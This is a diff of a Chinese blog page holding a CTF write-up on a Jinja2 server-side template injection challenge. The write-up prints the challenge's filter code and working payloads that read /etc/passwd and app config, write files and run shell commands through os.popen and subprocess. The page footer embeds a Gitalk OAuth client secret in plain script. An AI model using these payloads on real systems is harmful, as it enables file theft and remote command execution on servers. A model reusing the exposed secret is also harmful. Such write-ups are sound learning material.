@@ -4,7 +4,7 @@
 
 <head>
     
-    <title>文章归档 - scr1pt_k1ddi3&#39; blog</title>
+    <title>pwnhub-TemplatePlay - scr1pt_k1ddi3&#39; blog</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -12,23 +12,32 @@
     
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta property="og:type" content="website">
-<meta property="og:title" content="文章归档">
-<meta property="og:url" content="https://scr1pt-k1ddi3.github.io/archive.html">
+    <meta name="description" content="解题过程进去发现注入点：  经过长久的尝试，发现过滤似乎是过滤了[]. &quot;&quot;. &#39;&#39;. (). |等，所以只能是拿了一个不存在的函数去构造， 这是我写的payload： config:  &amp;#123;&amp;#123;t.__class__.__base__.__subclasses__()[280].__init__.__globals__[&#39;current_app">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnhub-TemplatePlay">
+<meta property="og:url" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/index.html">
 <meta property="og:site_name" content="scr1pt_k1ddi3&#39; blog">
+<meta property="og:description" content="解题过程进去发现注入点：  经过长久的尝试，发现过滤似乎是过滤了[]. &quot;&quot;. &#39;&#39;. (). |等，所以只能是拿了一个不存在的函数去构造， 这是我写的payload： config:  &amp;#123;&amp;#123;t.__class__.__base__.__subclasses__()[280].__init__.__globals__[&#39;current_app">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-04-13T14:16:19.393Z">
-<meta property="article:modified_time" content="2022-04-13T13:25:15.839Z">
+<meta property="og:image" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/1.png">
+<meta property="og:image" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/2.jpg">
+<meta property="og:image" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/3.png">
+<meta property="og:image" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/4.png">
+<meta property="article:published_time" content="2022-05-17T16:08:39.000Z">
+<meta property="article:modified_time" content="2022-05-17T16:23:42.896Z">
 <meta property="article:author" content="scr1pt_k1ddi3">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/1.png">
     <link
         rel="stylesheet"
         href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
     />
     
-    <link rel="stylesheet" href="/lib/mdui_043tiny/css/mdui.css?v=1652804635080">
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1652804635080">
-    <link rel="stylesheet" href="/css/style.css?v=1652804635080">
+    <link rel="stylesheet" href="/lib/mdui_043tiny/css/mdui.css?v=1652804635085">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1652804635085">
+    <link rel="stylesheet" href="/css/style.css?v=1652804635085">
      
     
 <meta name="generator" content="Hexo 6.1.0"></head>
@@ -67,7 +76,7 @@
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple true" href="/archive.html" title="文章归档">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
             <i class="mdui-list-item-icon nexmoefont icon-container"></i>
             <div class="mdui-list-item-content">
                 文章归档
@@ -260,81 +269,111 @@
     </div>
     <div id="nexmoe-content">
         <div class="nexmoe-primary">
-            <section class="nexmoe-archives">
-    
-    <div class="tagcloud nexmoe-rainbow">
-        <a class="mdui-ripple -unordered list-link" href="/tags/CTF/" rel="tag">CTF<span class="mdui-ripple -unordered list-count">2</span></a><a class="mdui-ripple -unordered list-link" href="/tags/hello/" rel="tag">hello<span class="mdui-ripple -unordered list-count">1</span></a><a class="mdui-ripple -unordered list-link" href="/tags/rce/" rel="tag">rce<span class="mdui-ripple -unordered list-count">1</span></a><a class="mdui-ripple -unordered list-link" href="/tags/web/" rel="tag">web<span class="mdui-ripple -unordered list-count">2</span></a>
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
+              <img src="https://pic.3gbizhi.com/2020/0821/thumb_1680_0_20200821035436699.jpg" alt="pwnhub-TemplatePlay" loading="lazy">
+              <h1>pwnhub-TemplatePlay</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2022年05月18日</a>
+</div>
+
+      <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>进去发现注入点：</p>
+<p><img data-fancybox="gallery" src="/2022/05/18/pwnhub-TemplatePlay/1.png" alt="1" loading="lazy"></p>
+<p>经过长久的尝试，发现过滤似乎是过滤了<code>[]. &quot;&quot;. &#39;&#39;. (). |</code>等，所以只能是拿了一个不存在的函数去构造，</p>
+<p>这是我写的payload：</p>
+<pre><code class="python">config: 
+&#123;&#123;t.__class__.__base__.__subclasses__()[280].__init__.__globals__['current_app'].config&#125;&#125;
+文件读取：
+&#123;&#123;t.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125;
+写文件：
+&#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','w').write("echo+'Hello,World!'")&#125;&#125;
+&#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','a').write("echo+'Hello,World!'")&#125;&#125;
+命令执行：
+&#123;&#123;t.__class__.__base__.__subclasses__()[261]("ls+/",shell=True,stdout=-1).communicate()[0]&#125;&#125;
+&#123;&#123;t.__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls+/').read()&#125;&#125;
+</code></pre>
+<p>但是我的payload无法读到二级目录，很奇怪，后来才知道是因为payload被限制了长度。</p>
+<p>读一下源码：</p>
+<p><img data-fancybox="gallery" src="/2022/05/18/pwnhub-TemplatePlay/2.jpg" alt="2" loading="lazy"></p>
+<p>过滤条件：</p>
+<pre><code class="python">string = request.values.get(&quot;string&quot;) 
+patter1 = re.compile(r&quot;\&#123;\&#123;[a-z]?_[a-z]?\.|[a-z]?\&quot;[a-z]*\.|[a-z]?\(.?\)\.|[a-z]?\[.?\]\.|[a-z]?\&#39;[a-z]?\.|\|&quot;) 
+unsafe_string = patter1.findall(string) 
+if unsafe_string: 
+    return render_template_string(&#39;&#39;&#39;&lt;p&gt;hello hacker&lt;/p&gt;&#39;&#39;&#39;) exit(0) 
+patter = re.compile(r&quot;\&#123;\&#123;[a-z]&#123;1,4&#125;\..*|\&#123;\&#123;[0-9\*\+-]&#123;1,10&#125;\&#125;\&#125;|[0-9a-z]*&quot;) 
+template_str = patter.findall(string, 0, 100) 
+if template_str[0] == &quot;&quot;: return render_template_string(&#39;&#39;&#39;&lt;p&gt;You input string unavailable&lt;/p&gt;&#39;&#39;&#39;) exit(0)
+</code></pre>
+<p>第一个正则是前面的过滤，后面的就有些离谱：</p>
+<p>如果是字母，那么就是.之前不能超过四个字母，纯数字不能超过10位。并截取前100，所以payload字符串超过100就返回500的原因。。。</p>
+<p>最终payload：</p>
+<pre><code class="php">&#123;&#123;ads.__init__.__globals__.__builtins__.__import__("os").popen("cat+/www/config/flag.txt").read()&#125;&#125;
+</code></pre>
+<p>这就是ads是不存在的，<code>ads.__init__</code>是undefind类，调用undefind类<code>__globals__</code>下的<code>__builtins__</code>然后import os。</p>
+<p>这个payload比较短，所以执行的命令就多。。。</p>
+<p><strong>这条payload看来也算是jinjia2 SSTI里的万能payload了</strong></p>
+<p>不过学长后来改过我的payload后也能读，TQL,ORZ！！！</p>
+<pre><code class="php">?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22ls%20/www/*%22,shell=True,stdout=-1).communicate()[0]&#125;&#125;
+</code></pre>
+<p><img data-fancybox="gallery" src="/2022/05/18/pwnhub-TemplatePlay/3.png" alt="3" loading="lazy"></p>
+<pre><code class="php">?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22cat%20/*/*/flag*%22,shell=1,stdout=-1).communicate()&#125;&#125;
+</code></pre>
+<p><img data-fancybox="gallery" src="/2022/05/18/pwnhub-TemplatePlay/4.png" alt="4" loading="lazy"></p>
+<p>反正就是只要知道了目录就好说了。。。</p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>scr1pt_k1ddi3<br>
+        <strong>本文链接：</strong><a href="https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/" title="https:&#x2F;&#x2F;scr1pt-k1ddi3.github.io&#x2F;2022&#x2F;05&#x2F;18&#x2F;pwnhub-TemplatePlay&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;scr1pt-k1ddi3.github.io&#x2F;2022&#x2F;05&#x2F;18&#x2F;pwnhub-TemplatePlay&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
     </div>
 
-    <div class="categories nexmoe-rainbow-fill">
-        
-            <!--加入动图API-->
-            
-                
-                 
-                     
-                
-            
-                
-                 
-                     
-                
-            
 
-            <a class="mdui-ripple" href="/categories/CTF/">
-                <div class="bg" style="background-image:url(https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fifengzhong.com%2Fwordpress%2Fwp-content%2Fuploads%2F2018%2F04%2Fmaxresdefault-1-1.jpg%3Fw%3D600&amp;refer=http%3A%2F%2Fifengzhong.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1652373121&amp;t=5001ea41c421e86842a9933102dc612d)"></div>
-                <h1>CTF</h1>
-            </a>
-        
-            <!--加入动图API-->
-            
-                
-                
-            
 
-            <a class="mdui-ripple" href="/categories/hello/">
-                <div class="bg" style="background-image:url(https://api.mtyqx.cn/tapi/random.php)"></div>
-                <h1>hello</h1>
-            </a>
-        
-            <!--加入动图API-->
-            
-                
-                 
-                     
-                
-            
-
-            <a class="mdui-ripple" href="/categories/CTF/write-up/">
-                <div class="bg" style="background-image:url(https://pic.3gbizhi.com/2020/0821/thumb_1680_0_20200821035436699.jpg)"></div>
-                <h1>write up</h1>
-            </a>
-        
-    </div>
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
     
-    <article>
-        
-        
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a><a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/write-up/">write up</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/web/" rel="tag">web</a>
+    
+</div>
 
-        
-            <h2>2022</h2>
-            <ul>
-            
-                <li><span>05-18</span><a href="/2022/05/18/pwnhub-TemplatePlay/" >pwnhub-TemplatePlay</a></li>
-            
-                <li><span>05-08</span><a href="/2022/05/08/ichunqiu-Mercy-code/" >ichunqiu-Mercy-code</a></li>
-            
-            </ul>
-        
-            <h2>2021</h2>
-            <ul>
-            
-                <li><span>04-08</span><a href="/2021/04/08/hello-world/" >hello world</a></li>
-            
-            </ul>
-        
-    </article>
+  
+      <div class="nexmoe-post-footer">
+          <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '762f6ad2361c14e2e989',
+        clientSecret: 'e5e68132970592e8817f80ff211273edee9cabc2',
+        id: window.location.pathname,
+        repo: 'scr1pt-k1ddi3.github.io',
+        owner: 'scr1pt-k1ddi3',
+        admin: 'scr1pt-k1ddi3'
+    })
+    gitalk.render('gitalk')
+</script>
 </section>
+      </div>
+  
+</div>
             <div class="nexmoe-post-right">
               <div class="nexmoe-fixed">
                   <div class="nexmoe-tool"> 
@@ -342,6 +381,13 @@
                       
                         
                           
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">解题过程</span></a></li></ol>
+                                  </div>
+                              </button>
                           
                           
                       
@@ -371,10 +417,10 @@
 
  
 
-<script async src="/js/app.js?v=1652804635081"></script>
+<script async src="/js/app.js?v=1652804635087"></script>
 
 
-	<script async src="/js/search.js?v=1652804635081"></script>
+	<script async src="/js/search.js?v=1652804635087"></script>
 
 
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
